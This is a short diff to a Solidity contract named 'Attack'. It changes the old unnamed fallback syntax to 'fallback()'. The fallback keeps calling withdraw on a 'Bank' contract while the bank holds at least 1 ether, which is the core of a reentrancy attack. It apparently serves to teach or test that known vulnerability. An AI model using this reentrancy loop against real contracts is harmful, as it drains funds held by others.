@@ -66,7 +66,7 @@ contract Attack {
         bank = Bank(_bank);
     }
 
-    function () external payable {
+    fallback() external payable {
         if (address(bank).balance &gt;= 1 ether) {
             bank.withdraw(1 ether);
         }
